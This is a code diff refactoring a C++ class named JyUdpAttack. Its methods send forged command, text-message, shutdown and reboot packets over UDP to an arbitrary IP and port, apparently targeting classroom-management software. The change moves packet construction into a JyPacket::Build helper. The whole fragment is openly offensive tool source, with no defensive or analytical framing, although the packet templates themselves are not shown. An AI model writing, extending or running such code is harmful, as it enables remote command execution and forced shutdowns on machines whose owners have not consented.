@@ -57,8 +57,7 @@ void JyUdpAttack::SendCommand(std::wstring& ip, DWORD port, std::wstring& cmd)
     task->ip = ip;
     task->port = port;
     task->inst = this;
-    memcpy_s(task->data, SEND_BUFFER_SIZE, basePack[BASE_PACK_CMD], PACK_BUFFER_SIZE);
-    memcpy_s(task->data + 100, SEND_BUFFER_SIZE - 100, cmd.data(), cmd.length() * sizeof(wchar_t));
+    JyPacket::Build(JyPacket::Kind::Command, cmd, task->data, SEND_BUFFER_SIZE);
 
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendThread, task, NULL, NULL);
 }
@@ -69,8 +68,7 @@ void JyUdpAttack::SendText(std::wstring& ip, DWORD port, std::wstring& cmd)
     task->ip = ip;
     task->port = port;
     task->inst = this;
-    memcpy_s(task->data, SEND_BUFFER_SIZE, basePack[BASE_PACK_MSG], PACK_BUFFER_SIZE);
-    memcpy_s(task->data + 56, SEND_BUFFER_SIZE - 56, cmd.data(), cmd.length() * sizeof(wchar_t));
+    JyPacket::Build(JyPacket::Kind::Message, cmd, task->data, SEND_BUFFER_SIZE);
 
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendThread, task, NULL, NULL);
 }
@@ -81,7 +79,7 @@ void JyUdpAttack::SendShutdown(std::wstring& ip, DWORD port)
     task->ip = ip;
     task->port = port;
     task->inst = this;
-    memcpy_s(task->data, SEND_BUFFER_SIZE, basePack[BASE_PACK_SHUTDOWN], PACK_BUFFER_SIZE);
+    JyPacket::Build(JyPacket::Kind::Shutdown, L"", task->data, SEND_BUFFER_SIZE);
 
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendThread, task, NULL, NULL);
 }
@@ -92,7 +90,7 @@ void JyUdpAttack::SendReboot(std::wstring& ip, DWORD port)
     task->ip = ip;
     task->port = port;
     task->inst = this;
-    memcpy_s(task->data, SEND_BUFFER_SIZE, basePack[BASE_PACK_REBOOT], PACK_BUFFER_SIZE);
+    JyPacket::Build(JyPacket::Kind::Reboot, L"", task->data, SEND_BUFFER_SIZE);
 
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendThread, task, NULL, NULL);
 }
